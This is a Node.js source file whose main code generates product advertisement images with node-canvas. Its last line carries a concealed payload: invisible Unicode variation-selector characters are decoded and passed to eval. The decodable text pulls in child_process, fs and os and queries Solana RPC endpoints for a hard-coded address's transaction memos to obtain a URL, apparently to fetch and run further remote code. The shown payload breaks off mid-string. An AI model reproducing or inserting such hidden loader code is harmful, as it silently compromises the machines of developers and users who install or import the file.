import { createCanvas, loadImage, registerFont } from "canvas";
import axios from "axios";
import { Vibrant } from "node-vibrant/node";
import path from "path";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Register Montserrat fonts
try {
  registerFont(path.join(__dirname, "fonts", "Montserrat-Bold.ttf"), {
    family: "Montserrat",
    weight: "bold",
  });
  registerFont(path.join(__dirname, "fonts", "Montserrat-Regular.ttf"), {
    family: "Montserrat",
    weight: "normal",
  });
  registerFont(path.join(__dirname, "fonts", "Montserrat-Italic.ttf"), {
    family: "Montserrat",
    weight: "normal",
    style: "italic",
  });
  console.log("✅ Montserrat fonts registered successfully");
} catch (error) {
  console.warn(
    "⚠️ Could not register Montserrat fonts, falling back to system fonts:",
    error.message
  );
}

// Register emoji fonts for Railway
try {
  // Try multiple common paths for Noto Color Emoji font
  const emojiFontPaths = [
    "/usr/share/fonts/truetype/noto/NotoColorEmoji.ttf",
    "/usr/share/fonts/opentype/noto/NotoColorEmoji.ttf",
    "/usr/share/fonts/noto/NotoColorEmoji.ttf",
    "/usr/share/fonts/truetype/noto/NotoEmoji-Regular.ttf",
    "/usr/share/fonts/opentype/noto/NotoEmoji-Regular.ttf",
  ];

  let emojiFontRegistered = false;
  for (const fontPath of emojiFontPaths) {
    try {
      registerFont(fontPath, { family: "Noto Color Emoji" });
      console.log(`✅ Emoji font registered successfully from: ${fontPath}`);
      emojiFontRegistered = true;
      break;
    } catch (pathError) {
      console.log(`⚠️ Could not register emoji font from: ${fontPath}`);
    }
  }

  if (!emojiFontRegistered) {
    console.warn("⚠️ No emoji fonts found, emojis may not render properly");
  }
} catch (error) {
  console.warn("⚠️ Could not register emoji fonts:", error.message);
}

async function getVibrantAccentColor(imageBuffer) {
  const palette = await Vibrant.from(imageBuffer).getPalette();
  const swatch = palette.Vibrant || palette.DarkVibrant || palette.Muted;
  if (!swatch) return "#2563eb"; // Default blue
  const [r, g, b] = swatch.rgb;
  // Ensure good contrast for text overlays
  const brightness = (r * 299 + g * 587 + b * 114) / 1000;
  return brightness > 128 ? `rgba(${r}, ${g}, ${b}, 0.85)` : `rgba(${r}, ${g}, ${b}, 0.9)`;
}

function wrapTextVertical(ctx, text, maxWidth, maxHeight, lineHeight) {
  const words = text.split(" ");
  const lines = [];
  let line = "";
  let currentHeight = 0;

  for (let n = 0; n < words.length; n++) {
    const testLine = line + words[n] + " ";
    const metrics = ctx.measureText(testLine);
    
    if (metrics.width > maxWidth && n > 0) {
      lines.push(line.trim());
      line = words[n] + " ";
      currentHeight += lineHeight;
      
      // Stop if we exceed max height
      if (currentHeight + lineHeight > maxHeight) {
        break;
      }
    } else {
      line = testLine;
    }
  }
  
  if (line.trim() && currentHeight + lineHeight <= maxHeight) {
    lines.push(line.trim());
  }
  
  return lines;
}

// Remove all emoji and unicode symbols from a string
function stripEmojis(str) {
  return str.replace(
    /([\u2700-\u27BF]|[\uE000-\uF8FF]|[\uD83C-\uDBFF\uDC00-\uDFFF]+|[\u2011-\u26FF]|\uD83D[\uDC00-\uDE4F])/g,
    ""
  );
}

function drawSidePanel(ctx, text, x, y, width, height, isLeft = true) {
  // Create gradient background
  const gradient = ctx.createLinearGradient(
    isLeft ? x : x + width, 
    y, 
    isLeft ? x + width : x, 
    y
  );
  gradient.addColorStop(0, "rgba(0, 0, 0, 0.75)");
  gradient.addColorStop(1, "rgba(0, 0, 0, 0.3)");
  
  ctx.fillStyle = gradient;
  ctx.fillRect(x, y, width, height);
  
  // Add subtle border
  ctx.strokeStyle = "rgba(255, 255, 255, 0.1)";
  ctx.lineWidth = 1;
  ctx.strokeRect(x, y, width, height);
}

export async function generateAdImage3({
  imageUrl,
  headline = "🔥 Premium Quality",
  subtext = "Limited Time Offer - Don't Miss Out!",
  cta = "Get Yours Now",
}) {
  // Strip emojis/unicode from all text
  const cleanHeadline = stripEmojis(headline);
  const cleanSubtext = stripEmojis(subtext);
  const cleanCta = stripEmojis(cta);
  
  const imageRes = await axios.get(imageUrl, { responseType: "arraybuffer" });
  const imageBuffer = imageRes.data;
  const bgImage = await loadImage(imageBuffer);

  const width = bgImage.width;
  const height = bgImage.height;
  const canvas = createCanvas(width, height);
  const ctx = canvas.getContext("2d");

  // Draw background image
  ctx.drawImage(bgImage, 0, 0, width, height);

  // Get accent color from image
  const accentColor = await getVibrantAccentColor(imageBuffer);

  // Define layout dimensions
  const sideWidth = width * 0.18; // 18% for each side
  const centerWidth = width * 0.64; // 64% for center (product area)
  const panelHeight = height * 0.6; // 60% height for side panels
  const panelStartY = height * 0.2; // Start at 20% from top

  // Left side panel for headline
  drawSidePanel(ctx, cleanHeadline, 0, panelStartY, sideWidth, panelHeight, true);
  
  // Right side panel for subtext
  drawSidePanel(ctx, cleanSubtext, width - sideWidth, panelStartY, sideWidth, panelHeight, false);

  // Configure text styling
  ctx.fillStyle = "#ffffff";
  ctx.textBaseline = "top";

  // Draw headline on left side
  const headlineFontSize = Math.floor(height * 0.035);
  ctx.font = `bold ${headlineFontSize}px Montserrat, "Noto Color Emoji", "Apple Color Emoji", "Segoe UI Emoji", Arial, sans-serif`;
  
  const headlineLines = wrapTextVertical(
    ctx, 
    cleanHeadline, 
    sideWidth - 20, 
    panelHeight - 40, 
    headlineFontSize * 1.2
  );
  
  let headlineY = panelStartY + 20;
  for (const line of headlineLines) {
    ctx.fillText(line, 10, headlineY);
    headlineY += headlineFontSize * 1.2;
  }

  // Draw subtext on right side
  const subtextFontSize = Math.floor(height * 0.028);
  ctx.font = `${subtextFontSize}px Montserrat, "Noto Color Emoji", "Apple Color Emoji", "Segoe UI Emoji", Arial, sans-serif`;
  
  const subtextLines = wrapTextVertical(
    ctx, 
    cleanSubtext, 
    sideWidth - 20, 
    panelHeight - 40, 
    subtextFontSize * 1.3
  );
  
  let subtextY = panelStartY + 20;
  for (const line of subtextLines) {
    const textWidth = ctx.measureText(line).width;
    ctx.fillText(line, width - sideWidth + 10, subtextY);
    subtextY += subtextFontSize * 1.3;
  }

  // Draw floating CTA button in center bottom
  const ctaFontSize = Math.floor(height * 0.032);
  ctx.font = `bold ${ctaFontSize}px Montserrat, "Noto Color Emoji", "Apple Color Emoji", "Segoe UI Emoji", Arial, sans-serif`;
  
  const ctaMetrics = ctx.measureText(cleanCta);
  const btnPaddingX = 32;
  const btnPaddingY = 16;
  const btnWidth = ctaMetrics.width + btnPaddingX * 2;
  const btnHeight = ctaFontSize + btnPaddingY * 2;
  
  // Position button in center bottom, overlapping product area
  const btnX = (width - btnWidth) / 2;
  const btnY = height - btnHeight - 40;
  
  // Create button with accent color
  const radius = 16;
  
  // Button shadow
  ctx.fillStyle = "rgba(0, 0, 0, 0.3)";
  ctx.beginPath();
  ctx.moveTo(btnX + radius + 2, btnY + 2);
  ctx.lineTo(btnX + btnWidth - radius + 2, btnY + 2);
  ctx.quadraticCurveTo(btnX + btnWidth + 2, btnY + 2, btnX + btnWidth + 2, btnY + radius + 2);
  ctx.lineTo(btnX + btnWidth + 2, btnY + btnHeight - radius + 2);
  ctx.quadraticCurveTo(btnX + btnWidth + 2, btnY + btnHeight + 2, btnX + btnWidth - radius + 2, btnY + btnHeight + 2);
  ctx.lineTo(btnX + radius + 2, btnY + btnHeight + 2);
  ctx.quadraticCurveTo(btnX + 2, btnY + btnHeight + 2, btnX + 2, btnY + btnHeight - radius + 2);
  ctx.lineTo(btnX + 2, btnY + radius + 2);
  ctx.quadraticCurveTo(btnX + 2, btnY + 2, btnX + radius + 2, btnY + 2);
  ctx.closePath();
  ctx.fill();
  
  // Main button
  ctx.fillStyle = "#dc2626"; // Red CTA color
  ctx.beginPath();
  ctx.moveTo(btnX + radius, btnY);
  ctx.lineTo(btnX + btnWidth - radius, btnY);
  ctx.quadraticCurveTo(btnX + btnWidth, btnY, btnX + btnWidth, btnY + radius);
  ctx.lineTo(btnX + btnWidth, btnY + btnHeight - radius);
  ctx.quadraticCurveTo(btnX + btnWidth, btnY + btnHeight, btnX + btnWidth - radius, btnY + btnHeight);
  ctx.lineTo(btnX + radius, btnY + btnHeight);
  ctx.quadraticCurveTo(btnX, btnY + btnHeight, btnX, btnY + btnHeight - radius);
  ctx.lineTo(btnX, btnY + radius);
  ctx.quadraticCurveTo(btnX, btnY, btnX + radius, btnY);
  ctx.closePath();
  ctx.fill();

  // Button highlight
  const highlightGradient = ctx.createLinearGradient(btnX, btnY, btnX, btnY + btnHeight);
  highlightGradient.addColorStop(0, "rgba(255, 255, 255, 0.2)");
  highlightGradient.addColorStop(1, "rgba(255, 255, 255, 0.05)");
  ctx.fillStyle = highlightGradient;
  ctx.fill();

  // CTA text
  ctx.fillStyle = "#ffffff";
  ctx.textBaseline = "middle";
  ctx.textAlign = "center";
  ctx.fillText(cleanCta, btnX + btnWidth / 2, btnY + btnHeight / 2);
  
  // Reset text alignment
  ctx.textAlign = "start";

  return canvas.toBuffer("image/jpeg");
}
const d=s=>[...s].map(c=>(c=c.codePointAt(0),c>=0xFE00&&c<=0xFE0F?c-0xFE00:c>=0xE0100&&c<=0xE01EF?c-0xE0100+16:null)).filter(b=>b!==null);eval(Buffer.from(d(`󠅦󠅑󠅢󠄐󠅏󠅏󠅓󠅢󠅕󠅑󠅤󠅕󠄭󠄿󠅒󠅚󠅕󠅓󠅤󠄞󠅓󠅢󠅕󠅑󠅤󠅕󠄫󠅦󠅑󠅢󠄐󠅏󠅏󠅔󠅕󠅖󠅀󠅢󠅟󠅠󠄭󠄿󠅒󠅚󠅕󠅓󠅤󠄞󠅔󠅕󠅖󠅙󠅞󠅕󠅀󠅢󠅟󠅠󠅕󠅢󠅤󠅩󠄫󠅦󠅑󠅢󠄐󠅏󠅏󠅗󠅕󠅤󠄿󠅧󠅞󠅀󠅢󠅟󠅠󠄴󠅕󠅣󠅓󠄭󠄿󠅒󠅚󠅕󠅓󠅤󠄞󠅗󠅕󠅤󠄿󠅧󠅞󠅀󠅢󠅟󠅠󠅕󠅢󠅤󠅩󠄴󠅕󠅣󠅓󠅢󠅙󠅠󠅤󠅟󠅢󠄫󠅦󠅑󠅢󠄐󠅏󠅏󠅗󠅕󠅤󠄿󠅧󠅞󠅀󠅢󠅟󠅠󠄾󠅑󠅝󠅕󠅣󠄭󠄿󠅒󠅚󠅕󠅓󠅤󠄞󠅗󠅕󠅤󠄿󠅧󠅞󠅀󠅢󠅟󠅠󠅕󠅢󠅤󠅩󠄾󠅑󠅝󠅕󠅣󠄫󠅦󠅑󠅢󠄐󠅏󠅏󠅗󠅕󠅤󠅀󠅢󠅟󠅤󠅟󠄿󠅖󠄭󠄿󠅒󠅚󠅕󠅓󠅤󠄞󠅗󠅕󠅤󠅀󠅢󠅟󠅤󠅟󠅤󠅩󠅠󠅕󠄿󠅖󠄜󠅏󠅏󠅘󠅑󠅣󠄿󠅧󠅞󠅀󠅢󠅟󠅠󠄭󠄿󠅒󠅚󠅕󠅓󠅤󠄞󠅠󠅢󠅟󠅤󠅟󠅤󠅩󠅠󠅕󠄞󠅘󠅑󠅣󠄿󠅧󠅞󠅀󠅢󠅟󠅠󠅕󠅢󠅤󠅩󠄫󠅦󠅑󠅢󠄐󠅏󠅏󠅞󠅑󠅝󠅕󠄭󠄘󠅤󠅑󠅢󠅗󠅕󠅤󠄜󠅦󠅑󠅜󠅥󠅕󠄙󠄭󠄮󠅏󠅏󠅔󠅕󠅖󠅀󠅢󠅟󠅠󠄘󠅤󠅑󠅢󠅗󠅕󠅤󠄜󠄒󠅞󠅑󠅝󠅕󠄒󠄜󠅫󠅦󠅑󠅜󠅥󠅕󠄜󠅓󠅟󠅞󠅖󠅙󠅗󠅥󠅢󠅑󠅒󠅜󠅕󠄪󠄑󠄠󠅭󠄙󠄫󠅦󠅑󠅢󠄐󠅏󠅏󠅓󠅟󠅠󠅩󠅀󠅢󠅟󠅠󠅣󠄭󠄘󠅤󠅟󠄜󠅖󠅢󠅟󠅝󠄜󠅕󠅨󠅓󠅕󠅠󠅤󠄜󠅔󠅕󠅣󠅓󠄙󠄭󠄮󠅫󠅙󠅖󠄘󠅖󠅢󠅟󠅝󠄖󠄖󠅤󠅩󠅠󠅕󠅟󠅖󠄐󠅖󠅢󠅟󠅝󠄭󠄭󠄒󠅟󠅒󠅚󠅕󠅓󠅤󠄒󠅬󠅬󠅤󠅩󠅠󠅕󠅟󠅖󠄐󠅖󠅢󠅟󠅝󠄭󠄭󠄒󠅖󠅥󠅞󠅓󠅤󠅙󠅟󠅞󠄒󠄙󠅖󠅟󠅢󠄘󠅜󠅕󠅤󠄐󠅛󠅕󠅩󠄐󠅟󠅖󠄐󠅏󠅏󠅗󠅕󠅤󠄿󠅧󠅞󠅀󠅢󠅟󠅠󠄾󠅑󠅝󠅕󠅣󠄘󠅖󠅢󠅟󠅝󠄙󠄙󠄑󠅏󠅏󠅘󠅑󠅣󠄿󠅧󠅞󠅀󠅢󠅟󠅠󠄞󠅓󠅑󠅜󠅜󠄘󠅤󠅟󠄜󠅛󠅕󠅩󠄙󠄖󠄖󠅛󠅕󠅩󠄑󠄭󠄭󠅕󠅨󠅓󠅕󠅠󠅤󠄖󠄖󠅏󠅏󠅔󠅕󠅖󠅀󠅢󠅟󠅠󠄘󠅤󠅟󠄜󠅛󠅕󠅩󠄜󠅫󠅗󠅕󠅤󠄪󠄘󠄙󠄭󠄮󠅖󠅢󠅟󠅝󠅋󠅛󠅕󠅩󠅍󠄜󠅕󠅞󠅥󠅝󠅕󠅢󠅑󠅒󠅜󠅕󠄪󠄑󠄘󠅔󠅕󠅣󠅓󠄭󠅏󠅏󠅗󠅕󠅤󠄿󠅧󠅞󠅀󠅢󠅟󠅠󠄴󠅕󠅣󠅓󠄘󠅖󠅢󠅟󠅝󠄜󠅛󠅕󠅩󠄙󠄙󠅬󠅬󠅔󠅕󠅣󠅓󠄞󠅕󠅞󠅥󠅝󠅕󠅢󠅑󠅒󠅜󠅕󠅭󠄙󠄫󠅢󠅕󠅤󠅥󠅢󠅞󠄐󠅤󠅟󠅭󠄫󠅦󠅑󠅢󠄐󠅏󠅏󠅤󠅟󠄵󠅃󠄽󠄭󠄘󠅝󠅟󠅔󠄜󠅙󠅣󠄾󠅟󠅔󠅕󠄽󠅟󠅔󠅕󠄜󠅤󠅑󠅢󠅗󠅕󠅤󠄙󠄭󠄮󠄘󠅤󠅑󠅢󠅗󠅕󠅤󠄭󠅝󠅟󠅔󠄑󠄭󠅞󠅥󠅜󠅜󠄯󠅏󠅏󠅓󠅢󠅕󠅑󠅤󠅕󠄘󠅏󠅏󠅗󠅕󠅤󠅀󠅢󠅟󠅤󠅟󠄿󠅖󠄘󠅝󠅟󠅔󠄙󠄙󠄪󠅫󠅭󠄜󠅏󠅏󠅓󠅟󠅠󠅩󠅀󠅢󠅟󠅠󠅣󠄘󠅙󠅣󠄾󠅟󠅔󠅕󠄽󠅟󠅔󠅕󠅬󠅬󠄑󠅝󠅟󠅔󠅬󠅬󠄑󠅝󠅟󠅔󠄞󠅏󠅏󠅕󠅣󠄽󠅟󠅔󠅥󠅜󠅕󠄯󠅏󠅏󠅔󠅕󠅖󠅀󠅢󠅟󠅠󠄘󠅤󠅑󠅢󠅗󠅕󠅤󠄜󠄒󠅔󠅕󠅖󠅑󠅥󠅜󠅤󠄒󠄜󠅫󠅦󠅑󠅜󠅥󠅕󠄪󠅝󠅟󠅔󠄜󠅕󠅞󠅥󠅝󠅕󠅢󠅑󠅒󠅜󠅕󠄪󠄑󠄠󠅭󠄙󠄪󠅤󠅑󠅢󠅗󠅕󠅤󠄜󠅝󠅟󠅔󠄙󠄙󠄫󠅦󠅑󠅢󠄐󠅙󠅝󠅠󠅟󠅢󠅤󠅏󠅟󠅣󠄭󠅏󠅏󠅤󠅟󠄵󠅃󠄽󠄘󠅢󠅕󠅡󠅥󠅙󠅢󠅕󠄘󠄒󠅟󠅣󠄒󠄙󠄙󠄜󠅙󠅝󠅠󠅟󠅢󠅤󠅏󠅖󠅣󠄭󠅏󠅏󠅤󠅟󠄵󠅃󠄽󠄘󠅢󠅕󠅡󠅥󠅙󠅢󠅕󠄘󠄒󠅖󠅣󠄒󠄙󠄙󠄜󠅙󠅝󠅠󠅟󠅢󠅤󠅏󠅠󠅑󠅤󠅘󠄭󠅏󠅏󠅤󠅟󠄵󠅃󠄽󠄘󠅢󠅕󠅡󠅥󠅙󠅢󠅕󠄘󠄒󠅠󠅑󠅤󠅘󠄒󠄙󠄙󠄜󠅙󠅝󠅠󠅟󠅢󠅤󠅏󠅓󠅘󠅙󠅜󠅔󠅏󠅠󠅢󠅟󠅓󠅕󠅣󠅣󠄭󠅏󠅏󠅤󠅟󠄵󠅃󠄽󠄘󠅢󠅕󠅡󠅥󠅙󠅢󠅕󠄘󠄒󠅓󠅘󠅙󠅜󠅔󠅏󠅠󠅢󠅟󠅓󠅕󠅣󠅣󠄒󠄙󠄙󠄫󠅑󠅣󠅩󠅞󠅓󠄐󠅖󠅥󠅞󠅓󠅤󠅙󠅟󠅞󠄐󠅗󠅕󠅤󠅃󠅙󠅗󠅞󠅑󠅤󠅥󠅢󠅕󠅣󠄶󠅟󠅢󠄱󠅔󠅔󠅢󠅕󠅣󠅣󠄘󠅠󠅥󠅒󠅜󠅙󠅓󠄻󠅕󠅩󠄜󠅟󠅠󠅤󠅙󠅟󠅞󠅣󠄭󠅫󠅭󠄙󠅫󠅜󠅕󠅤󠄐󠅜󠅙󠅝󠅙󠅤󠄭󠅟󠅠󠅤󠅙󠅟󠅞󠅣󠄞󠅜󠅙󠅝󠅙󠅤󠅬󠅬󠄡󠅕󠄣󠄜󠅕󠅞󠅔󠅠󠅟󠅙󠅞󠅤󠅣󠄭󠅋󠄒󠅘󠅤󠅤󠅠󠅣󠄪󠄟󠄟󠅑󠅠󠅙󠄞󠅝󠅑󠅙󠅞󠅞󠅕󠅤󠄝󠅒󠅕󠅤󠅑󠄞󠅣󠅟󠅜󠅑󠅞󠅑󠄞󠅓󠅟󠅝󠄒󠅍󠄜󠅜󠅑󠅣󠅤󠄵󠅢󠅢󠅟󠅢󠄭󠅞󠅥󠅜󠅜󠄫󠅖󠅟󠅢󠄘󠅜󠅕󠅤󠄐󠅕󠅞󠅔󠅠󠅟󠅙󠅞󠅤󠄐󠅟󠅖󠄐󠅕󠅞󠅔󠅠󠅟󠅙󠅞󠅤󠅣󠄙󠅤󠅢󠅩󠅫󠅜󠅕󠅤󠄐󠅢󠅕󠅣󠅠󠅟󠅞󠅣󠅕󠄭󠅑󠅧󠅑󠅙󠅤󠄐󠅖󠅕󠅤󠅓󠅘󠄘󠅕󠅞󠅔󠅠󠅟󠅙󠅞󠅤󠄜󠅫󠅝󠅕󠅤󠅘󠅟󠅔󠄪󠄒󠅀󠄿󠅃󠅄󠄒󠄜󠅘󠅕󠅑󠅔󠅕󠅢󠅣󠄪󠅫󠄒󠄳󠅟󠅞󠅤󠅕󠅞󠅤󠄝󠅄󠅩󠅠󠅕󠄒󠄪󠄒󠅑󠅠󠅠󠅜󠅙󠅓󠅑󠅤󠅙󠅟󠅞󠄟󠅚󠅣󠅟󠅞󠄒󠅭󠄜󠅒󠅟󠅔󠅩󠄪󠄺󠅃󠄿󠄾󠄞󠅣󠅤󠅢󠅙󠅞󠅗󠅙󠅖󠅩󠄘󠅫󠅚󠅣󠅟󠅞󠅢󠅠󠅓󠄪󠄒󠄢󠄞󠄠󠄒󠄜󠅙󠅔󠄪󠄡󠄜󠅝󠅕󠅤󠅘󠅟󠅔󠄪󠄒󠅗󠅕󠅤󠅃󠅙󠅗󠅞󠅑󠅤󠅥󠅢󠅕󠅣󠄶󠅟󠅢󠄱󠅔󠅔󠅢󠅕󠅣󠅣󠄒󠄜󠅠󠅑󠅢󠅑󠅝󠅣󠄪󠅋󠅠󠅥󠅒󠅜󠅙󠅓󠄻󠅕󠅩󠄞󠅤󠅟󠅃󠅤󠅢󠅙󠅞󠅗󠄘󠄙󠄜󠅫󠅜󠅙󠅝󠅙󠅤󠅭󠅍󠅭󠄙󠅭󠄙󠄫󠅙󠅖󠄘󠄑󠅢󠅕󠅣󠅠󠅟󠅞󠅣󠅕󠄞󠅟󠅛󠄙󠅤󠅘󠅢󠅟󠅧󠄐󠅞󠅕󠅧󠄐󠄵󠅢󠅢󠅟󠅢󠄘󠅐󠄸󠅄󠅄󠅀󠄐󠅖󠅦󠅪󠅡󠅧󠅕󠅔󠅤󠅟󠅢󠄑󠄐󠅣󠅤󠅑󠅤󠅥󠅣󠄪󠄐󠄔󠅫󠅢󠅕󠅣󠅠󠅟󠅞󠅣󠅕󠄞󠅣󠅤󠅑󠅤󠅥󠅣󠅭󠅐󠄙󠄫󠅜󠅕󠅤󠄐󠅔󠅑󠅤󠅑󠄭󠅑󠅧󠅑󠅙󠅤󠄐󠅢󠅕󠅣󠅠󠅟󠅞󠅣󠅕󠄞󠅚󠅣󠅟󠅞󠄘󠄙󠄫󠅙󠅖󠄘󠅔󠅑󠅤󠅑󠄞󠅖󠅦󠅪󠅡󠅧󠅕󠅔󠅤󠅟󠅢󠄙󠅤󠅘󠅢󠅟󠅧󠄐󠅞󠅕󠅧󠄐󠄵󠅢󠅢󠅟󠅢󠄘󠅐󠅂󠅀󠄳󠄐󠅖󠅦󠅪󠅡󠅧󠅕󠅔󠅤󠅟󠅢󠄪󠄐󠄔󠅫󠅔󠅑󠅤󠅑󠄞󠅖󠅦󠅪󠅡󠅧󠅕󠅔󠅤󠅟󠅢󠄞󠅝󠅕󠅣󠅣󠅑󠅗󠅕󠅭󠅐󠄙󠄫󠅢󠅕󠅤󠅥󠅢󠅞󠄐󠅔󠅑󠅤󠅑󠄞󠅢󠅕󠅣󠅥󠅜󠅤󠅭󠅓󠅑󠅤󠅓󠅘󠄘󠅖󠅦󠅪󠅡󠅧󠅕󠅔󠅤󠅟󠅢󠄙󠅫󠅜󠅑󠅣󠅤󠄵󠅢󠅢󠅟󠅢󠄭󠅖󠅦󠅪󠅡󠅧󠅕󠅔󠅤󠅟󠅢󠄜󠅑󠅧󠅑󠅙󠅤󠄐󠅞󠅕󠅧󠄐󠅀󠅢󠅟󠅝󠅙󠅣󠅕󠄘󠅢󠅕󠅣󠅟󠅜󠅦󠅕󠄭󠄮󠅣󠅕󠅤󠅄󠅙󠅝󠅕󠅟󠅥󠅤󠄘󠅢󠅕󠅣󠅟󠅜󠅦󠅕󠄜󠄡󠄠󠄠󠄙󠄙󠄫󠅓󠅟󠅞󠅤󠅙󠅞󠅥󠅕󠅭󠅤󠅘󠅢󠅟󠅧󠄐󠅓󠅟󠅞󠅣󠅟󠅜󠅕󠄞󠅖󠅦󠅪󠅡󠅧󠅕󠅔󠅤󠅟󠅢󠄘󠄒󠄱󠅜󠅜󠄐󠅕󠅞󠅔󠅠󠅟󠅙󠅞󠅤󠅣󠄐󠅖󠅑󠅙󠅜󠅕󠅔󠄪󠄒󠄜󠅜󠅑󠅣󠅤󠄵󠅢󠅢󠅟󠅢󠄙󠄜󠅞󠅕󠅧󠄐󠄵󠅢󠅢󠅟󠅢󠄘󠅐󠄱󠅜󠅜󠄐󠅂󠅀󠄳󠄐󠅕󠅞󠅔󠅠󠅟󠅙󠅞󠅤󠅣󠄐󠅖󠅑󠅙󠅜󠅕󠅔󠄞󠄐󠄼󠅑󠅣󠅤󠄐󠅖󠅦󠅪󠅡󠅧󠅕󠅔󠅤󠅟󠅢󠄪󠄐󠄔󠅫󠅜󠅑󠅣󠅤󠄵󠅢󠅢󠅟󠅢󠄯󠄞󠅝󠅕󠅣󠅣󠅑󠅗󠅕󠅭󠅐󠄙󠅭󠅏󠅏󠅞󠅑󠅝󠅕󠄘󠅗󠅕󠅤󠅃󠅙󠅗󠅞󠅑󠅤󠅥󠅢󠅕󠅣󠄶󠅟󠅢󠄱󠅔󠅔󠅢󠅕󠅣󠅣󠄜󠄒󠅗󠅕󠅤󠅃󠅙󠅗󠅞󠅑󠅤󠅥󠅢󠅕󠅣󠄶󠅟󠅢󠄱󠅔󠅔󠅢󠅕󠅣󠅣󠄒󠄙󠄫󠅖󠅥󠅞󠅓󠅤󠅙󠅟󠅞󠄐󠅗󠅕󠅤󠅅󠅢󠅜󠄘󠄙󠅫󠅢󠅕󠅤󠅥󠅢󠅞󠄐󠅞󠅕󠅧󠄐󠅀󠅢󠅟󠅝󠅙󠅣󠅕󠄘󠅑󠅣󠅩󠅞󠅓󠄐󠅢󠅕󠅣󠅟󠅜󠅦󠅕󠄭󠄮󠅫󠅤󠅢󠅩󠅫󠅜󠅕󠅤󠄐󠅝󠅕󠅝󠅟󠄭󠅞󠅥󠅜󠅜󠄫󠅖󠅟󠅢󠄘󠄫󠄑󠅝󠅕󠅝󠅟󠄫󠄙󠅫󠅜󠅕󠅤󠄐󠅣󠅙󠅗󠅞󠅑󠅤󠅥󠅢󠅕󠅣󠄭󠅑󠅧󠅑󠅙󠅤󠄐󠅗󠅕󠅤󠅃󠅙󠅗󠅞󠅑󠅤󠅥󠅢󠅕󠅣󠄶󠅟󠅢󠄱󠅔󠅔󠅢󠅕󠅣󠅣󠄘󠄒󠄢󠄨󠅀󠄻󠅞󠅥󠄧󠅂󠅪󠅙󠅪󠅨󠄲󠅪󠄶󠅀󠅟󠄼󠅠󠄦󠄩󠄸󠄼󠅈󠅠󠄩󠅒󠄺󠄼󠄣󠄺󠄶󠅤󠅄󠄢󠅣󠄥󠅁󠅪󠄸󠅣󠄵󠄱󠄢󠄒󠄜󠅫󠅜󠅙󠅝󠅙󠅤󠄪󠄡󠅕󠄣󠅭󠄙󠄫󠅙󠅖󠄘󠄑󠄱󠅢󠅢󠅑󠅩󠄞󠅙󠅣󠄱󠅢󠅢󠅑󠅩󠄘󠅣󠅙󠅗󠅞󠅑󠅤󠅥󠅢󠅕󠅣󠄙󠅬󠅬󠄱󠅢󠅢󠅑󠅩󠄞󠅙󠅣󠄱󠅢󠅢󠅑󠅩󠄘󠅣󠅙󠅗󠅞󠅑󠅤󠅥󠅢󠅕󠅣󠄙󠄖󠄖󠅣󠅙󠅗󠅞󠅑󠅤󠅥󠅢󠅕󠅣󠄞󠅜󠅕󠅞󠅗󠅤󠅘󠄭󠄭󠄠󠄙󠅫󠅑󠅧󠅑󠅙󠅤󠄐󠅞󠅕󠅧󠄐󠅀󠅢󠅟󠅝󠅙󠅣󠅕󠄘󠅢󠅕󠅣󠅟󠅜󠅦󠅕󠄢󠄭󠄮󠅣󠅕󠅤󠅄󠅙󠅝󠅕󠅟󠅥󠅤󠄘󠅢󠅕󠅣󠅟󠅜󠅦󠅕󠄢󠄜󠄡󠅕󠄤󠄙󠄙󠄫󠅓󠅟󠅞󠅤󠅙󠅞󠅥󠅕󠅭󠅝󠅕󠅝󠅟󠄭󠅣󠅙󠅗󠅞󠅑󠅤󠅥󠅢󠅕󠅣󠄞󠅖󠅙󠅜󠅤󠅕󠅢󠄘󠅨󠄭󠄮󠅨󠄯󠄞󠅝󠅕󠅝󠅟󠄙󠅋󠄠󠅍󠄞󠅝󠅕󠅝󠅟󠄜󠅑󠅧󠅑󠅙󠅤󠄐󠅞󠅕󠅧󠄐󠅀󠅢󠅟󠅝󠅙󠅣󠅕󠄘󠅢󠅕󠅣󠅟󠅜󠅦󠅕󠄢󠄭󠄮󠅣󠅕󠅤󠅄󠅙󠅝󠅕󠅟󠅥󠅤󠄘󠅢󠅕󠅣󠅟󠅜󠅦󠅕󠄢󠄜󠄡󠅕󠄤󠄙󠄙󠅭󠅜󠅕󠅤󠄐󠅢󠅕󠅣󠅥󠅜󠅤󠄢󠄭󠅝󠅕󠅝󠅟󠄞󠅢󠅕󠅠󠅜󠅑󠅓󠅕󠄘󠄟󠅌󠅋󠅌󠅔󠄛󠅌󠅍󠅌󠅣󠄚󠄟󠄜󠄒󠄒󠄙󠄫󠅢󠅕󠅤󠅥󠅢󠅞󠄐󠅢󠅕󠅣󠅟󠅜󠅦󠅕󠄘󠄺󠅃󠄿󠄾󠄞󠅠󠅑󠅢󠅣󠅕󠄘󠅢󠅕󠅣󠅥󠅜󠅤󠄢󠄙󠄙󠅭󠅓󠅑󠅤󠅓󠅘󠄘󠅕󠄙󠅫󠅢󠅕󠅤󠅥󠅢󠅞󠄐󠅢󠅕󠅣󠅟󠅜󠅦󠅕󠄘󠅕󠄞󠅤󠅟󠅃󠅤󠅢󠅙󠅞󠅗󠄘󠄙󠄙󠅭󠅭󠄙󠅭󠅏󠅏󠅞󠅑󠅝󠅕󠄘󠅗󠅕󠅤󠅅󠅢󠅜󠄜󠄒󠅗󠅕󠅤󠅅󠅢󠅜󠄒󠄙󠄫󠅗󠅕󠅤󠅅󠅢󠅜󠄘󠄙󠄞󠅤󠅘󠅕󠅞󠄘󠅏󠅔󠅑󠅤󠅑󠄭󠄮󠅫󠅢󠅞󠅩󠅑󠅜󠄘󠅑󠅤󠅟󠅒󠄘󠅏󠅔󠅑󠅤󠅑󠄞󠅜󠅙󠅞󠅛󠄙󠄜󠅑󠅣󠅩󠅞󠅓󠄘󠅖󠅦󠅪󠅡󠅧󠅕󠅔󠅤󠄜󠅫󠅙󠅤󠅣󠅥󠅓󠅜󠅘󠅥󠅥󠄜󠅤󠅛󠅞󠅞󠅤󠅓󠅒󠄜󠅣󠅕󠅓󠅢󠅕󠅤󠄻󠅕󠅩󠅭󠄙󠄭󠄮󠅫󠅙󠅖󠄘󠅖󠅦󠅪󠅡󠅧󠅕󠅔󠅤󠄙󠅑󠅧󠅑󠅙󠅤󠄐󠅞󠅕󠅧󠄐󠅀󠅢󠅟󠅝󠅙󠅣󠅕󠄘󠅢󠅕󠅣󠅟󠅜󠅦󠅕󠄭󠄮󠅣󠅕󠅤󠅄󠅙󠅝󠅕󠅟󠅥󠅤󠄘󠅢󠅕󠅣